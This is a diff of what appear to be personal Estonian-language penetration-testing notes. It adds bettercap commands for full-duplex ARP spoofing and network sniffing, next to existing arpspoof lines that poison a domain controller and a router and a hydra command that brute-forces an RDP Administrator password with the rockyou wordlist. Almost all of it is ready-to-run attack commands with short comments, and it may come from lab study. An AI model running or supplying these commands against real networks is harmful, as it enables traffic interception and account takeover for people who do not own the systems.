@@ -142,6 +142,21 @@ ARP Spoof:
   sudo arpspoof -i eth0 -t 192.168.1.2 192.168.1.1 (mürgitame DCd)
   sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.2 (mürgitame ruuterit)
 
+parem variant
+  UI:  
+    sudo bettercap
+    sudo bettercap -eval "caplets.update; ui.update; q"
+    sudo bettercap -eval "ui on"
+    Mine veebivaatesse
+Term:
+  sudo bettercap
+  net.probe on (paneme kuulama)
+  set arp.spoof.fullduplex true (sätime samaaegse edasi-tagasi liikluse)
+  set arp.spoof.targets 192.168.1.x
+  arp.spoof on
+  net.sniff on
+  
+
 hydra -V -f -l Administrator -P /home/user/Documents/rockyou.txt rdp://192.168.1.2 (Proovime kräkida Administraator parooli)
 
 
